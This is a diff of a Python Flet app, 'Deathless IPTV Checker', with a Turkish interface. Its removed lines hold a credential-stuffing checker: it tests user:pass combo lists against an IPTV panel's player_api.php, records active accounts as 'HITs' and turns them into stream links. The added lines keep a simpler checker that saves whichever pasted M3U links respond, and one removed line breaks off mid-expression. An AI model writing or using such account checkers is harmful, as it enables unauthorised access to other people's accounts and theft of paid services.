@@ -1,6 +1,5 @@
 import flet as ft
 import requests
-import re
 import os
 
 def main(page: ft.Page):
@@ -8,111 +7,62 @@ def main(page: ft.Page):
     page.theme_mode = ft.ThemeMode.DARK
     page.scroll = ft.ScrollMode.AUTO
     
-    # UI Elemanları
-    lbl_title = ft.Text("DEATHLESS CHECKER", size=30, weight="bold", color="indigo")
-    lbl_hit = ft.Text("0", size=40, color="green", weight="bold")
-    lbl_bad = ft.Text("0", size=40, color="red", weight="bold")
+    lbl_info = ft.Text("Deathless IPTV Checker", size=25, weight="bold", color="blue")
+    lbl_status = ft.Text("Hazır", color="white")
     
-    txt_m3u = ft.TextField(label="M3U Linkleri", multiline=True, min_lines=3)
-    txt_combo = ft.TextField(label="Combo (user:pass)", multiline=True, min_lines=3)
-    txt_panel = ft.TextField(label="Panel Adresi (http://site:port)", hint_text="http://url:8080")
+    txt_m3u = ft.TextField(label="M3U Linkleri Yapıştır", multiline=True, min_lines=5)
     
-    hits = []
+    def save_file(content):
+        filename = "Deathless-Hits.txt"
+        path = f"/storage/emulated/0/Download/{filename}"
+        try:
+            with open(path, "a", encoding="utf-8") as f:
+                f.write(content + "\n")
+            return f"Kaydedildi: {path}"
+        except:
+            return "Kaydetme hatası (İzin yok)"
 
-    def save_data(e):
-        if not hits:
-            page.snack_bar = ft.SnackBar(ft.Text("Kaydedilecek HIT yok!"))
-            page.snack_bar.open = True
+    def start_check(e):
+        if not txt_m3u.value:
+            lbl_status.value = "Lütfen link yapıştırın!"
             page.update()
             return
             
-        content = "\n".join(hits)
-        filename = f"Deathless-{len(hits)}Hit.txt"
+        lbl_status.value = "Taranıyor..."
+        page.update()
         
-        # Android path
-        path = f"/storage/emulated/0/Download/{filename}"
+        lines = txt_m3u.value.splitlines()
+        hits = 0
         
-        try:
-            with open(path, "w", encoding="utf-8") as f:
-                f.write(content)
-            page.snack_bar = ft.SnackBar(ft.Text(f"Kaydedildi: {path}"))
-        except:
-            # PC path fallback
-            with open(filename, "w", encoding="utf-8") as f:
-                f.write(content)
-            page.snack_bar = ft.SnackBar(ft.Text("Kaydedildi (Yerel)"))
-            
-        page.snack_bar.open = True
+        for line in lines:
+            line = line.strip()
+            if "http" in line:
+                try:
+                    # Basit bağlantı testi
+                    response = requests.get(line, timeout=5)
+                    if response.status_code == 200:
+                        hits += 1
+                        save_file(line)
+                        lbl_status.value = f"HIT Bulundu: {hits}"
+                        page.update()
+                except:
+                    pass
+        
+        if hits == 0:
+            lbl_status.value = "Tarama bitti, çalışan yok."
+        else:
+            lbl_status.value = f"Bitti! Toplam {hits} çalışan link kaydedildi."
         page.update()
 
-    def check_url(url):
-        try:
-            res = requests.get(url, timeout=5).json()
-            if res.get("user_info", {}).get("status") == "Active":
-                return True
-        except:
-            pass
-        return False
-
-    def start_check(e):
-        hits.clear()
-        hit_count = 0
-        bad_count = 0
-        
-        # Combo Modu
-        if txt_combo.value and txt_panel.value:
-            lines = txt_combo.value.splitlines()
-            base = txt_panel.value.strip()
-            for line in lines:
-                if ":" in line:
-                    u, p = line.split(":")[0], line.split(":")[1]
-                    target = f"{base}/player_api.php?username={u}&password={p}"
-                    if check_url(target):
-                        hit_count += 1
-                        full_link = f"{base}/get.php?username={u}&password={p}&type=m3u_plus"
-                        hits.append(full_link)
-                        lbl_hit.value = str(hit_count)
-                    else:
-                        bad_count += 1
-                        lbl_bad.value = str(bad_count)
-                    page.update()
-        
-        # M3U Modu
-        elif txt_m3u.value:
-            lines = txt_m3u.value.splitlines()
-            for line in lines:
-                if "username=" in line:
-                    try:
-                        # Linki ayrıştır ve API formatına çevir
-                        base_match = re.search(r'(http://.*?)/', line)
-                        user_match = re.search(r'username=([^&]*)', line)
-                        pass_match = re.search(r'password=([^&]*)', line)
-                        
-                        if base_match and user_match and pass_match:
-                            base = base_match.group(1)
-                            u = user_match.group(1)
-                            p = pass_match.group(1)
-                            
-                            target = f"{base}/player_api.php?username={u}&password={p}"
-                            if check_url(target):
-                                hit_count += 1
-                                hits.append(line.strip())
-                                lbl_hit.value = str(hit_count)
-                            else:
-                                bad_count += 1
-                                lbl_bad.value = str(bad_count)
-                            page.update()
-                    except:
-                        pass
-
-    # Sayfa Düzeni
+    btn_start = ft.ElevatedButton("TARAMAYI BAŞLAT", on_click=start_check)
+    
     page.add(
-        ft.Column([
-            lbl_title,
-            ft.Row([
-                ft.Column([ft.Text("HIT"), lbl_hit]),
-                ft.Column([ft.Text("BAD"), lbl_bad])
-            ], alignment=ft.MainAxisAlignment.SPACE_AROUND),
-            ft.Tabs(tabs=[
-                ft.Tab(text="Link", content=ft.Container(content=txt_m3u, padding=10)),
-                ft.Tab(text="Combo", content=ft
+        lbl_info,
+        txt_m3u,
+        btn_start,
+        lbl_status
+    )
+
+if __name__ == "__main__":
+    ft.app(target=main)
+    
